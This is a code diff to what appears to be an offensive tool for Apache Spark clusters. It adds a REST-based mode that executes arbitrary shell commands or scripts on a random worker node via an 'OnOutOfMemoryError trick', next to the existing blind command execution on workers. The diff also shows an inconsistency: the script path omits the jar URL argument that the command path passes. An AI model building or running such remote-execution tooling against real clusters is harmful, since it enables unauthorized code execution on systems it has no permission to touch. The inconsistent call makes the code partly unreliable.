@@ -8,7 +8,7 @@ from utils.general import (
     checkHTTPPort,
     whine,
 )
-from utils.cmd import parseCommandOutput, blindCommandExec
+from utils.cmd import parseCommandOutput, blindCommandExec, restCommandExec
 import multiprocessing
 import sys, os, signal, base64
 
@@ -50,6 +50,7 @@ def main(results):
     username = results.username
     target = hostPort[0]
     binPath = results.binPath
+    restJarURL = results.restJarURL
     port = 8032 if results.yarn else 7077
     if len(hostPort) > 1:
         port = int(hostPort[1])
@@ -63,6 +64,15 @@ def main(results):
     if results.yarn:
         sClient.yarn = True
         sClient.hdfs = results.hdfs
+
+    if not results.restJarURL is None:
+        sClient.useRest = True
+        if not results.cmd and not results.script:
+            whine(
+                "Please provide a command (-c) or script (-s) to execute via REST",
+                "err",
+            )
+            sys.exit(-1)
 
     confirmSpark(sClient)
     validateAuthenticationOptions(sClient, results)
@@ -78,7 +88,7 @@ def main(results):
     if results.blind:
         whine("Performing blind command execution on workers", "info")
         sClient.useBlind = True
-    elif sClient.sc is None:
+    elif sClient.sc is None and not sClient.useRest:
         sClient.initContext(results.secret)
         print("")
 
@@ -100,6 +110,8 @@ def main(results):
     if results.cmd:
         if sClient.useBlind:
             blindCommandExec(sClient, binPath, base64.b64encode(results.cmd))
+        elif sClient.useRest:
+            restCommandExec(sClient, binPath, base64.b64encode(results.cmd), restJarURL)
         else:
             interpreterArgs = [binPath, "-c", results.cmd]
             parseCommandOutput(sClient, interpreterArgs, results.numWokers)
@@ -108,6 +120,8 @@ def main(results):
         scriptContent = results.script.read()
         if sClient.useBlind:
             blindCommandExec(sClient, binPath, base64.b64encode(scriptContent))
+        elif sClient.useRest:
+            restCommandExec(sClient, binPath, base64.b64encode(scriptContent))
         else:
             interpreterArgs = [binPath, "-c", scriptContent]
             parseCommandOutput(sClient, interpreterArgs, results.numWokers)
@@ -147,10 +161,12 @@ if __name__ == "__main__":
     group_cmd = parser.add_argument_group("Command execution")
     group_cloud = parser.add_argument_group("Cloud environment (AWS, DigitalOcean)")
 
+    ## General options ##
+    ###################
     group_general.add_argument(
         "-l",
-        "--list-nodes",
-        help="List of executor nodes",
+        "--list",
+        help="test for REST API, HTTP interface, list executor nodes, version, applications if possible",
         action="store_true",
         default=False,
         dest="listNodes",
@@ -231,6 +247,8 @@ if __name__ == "__main__":
         dest="httpPort",
     )
 
+    ## Command options ##
+    ###################
     group_cmd.add_argument(
         "-c",
         "--cmd",
@@ -263,6 +281,14 @@ if __name__ == "__main__":
         dest="numWokers",
     )
     group_cmd.add_argument(
+        "-w",
+        "--rest-exec",
+        nargs="?",
+        help="Execute a system command or bash on a random worker using OnOutOfMemoryError trick. However, you can provide a legitimate jar file to execute. format: FULL_JAR_URL::MAIN_Class",
+        const="spark://%s:%s",
+        dest="restJarURL",
+    )
+    group_cmd.add_argument(
         "-x",
         "--runtime",
         help="Shell binary to execute commands and scripts on workers. Example values: sh, bash, zsh, ksh",
@@ -270,6 +296,8 @@ if __name__ == "__main__":
         dest="binPath",
     )
 
+    ## Cloud options ##
+    ###################
     group_cloud.add_argument(
         "-u",
         "--user-data",
